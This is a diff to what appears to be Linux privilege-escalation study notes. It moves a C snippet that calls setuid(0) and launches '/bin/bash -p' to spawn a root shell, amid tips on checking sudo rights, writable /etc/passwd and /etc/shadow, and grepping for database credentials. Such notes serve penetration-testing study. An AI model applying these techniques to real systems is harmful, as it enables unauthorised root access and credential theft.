@@ -38,14 +38,6 @@ Lets then look to see if the current user can run any commands with elevated pri
 sudo -l
 ```
 
-Are there any processes being executed that we can control? The C following code spawns a root shell.
-```c
-int main() {
-    setuid(0);
-    system("/bin/bash -p"):
-}
-```
-
 Can we write to or read /etc/shadow, can we write to /etc/passwd, /etc/sudoers. Whats inside /etc/sudoers.d/.  
 
 Here we can write to /etc/passwd
@@ -129,6 +121,14 @@ find . -type f -exec grep -i -I "DB_USER" {} /dev/null \; 2> /dev/null
 ## Can We Find Any Misconfigurations
 
 We can start by running [PSPY](https://github.com/DominicBreuker/pspy) on the target system. This will show us what commands are being run on the system by other users, E.g. cron jobs and automated scripts.
+
+Are there any processes being executed that we can control? The following C code spawns a root shell.
+```c
+int main() {
+    setuid(0);
+    system("/bin/bash -p"):
+}
+```
 
 If we find any unusual binarys, we can do some [Binary Analysis](https://opensource.com/article/20/4/linux-binary-analysis)
 ```
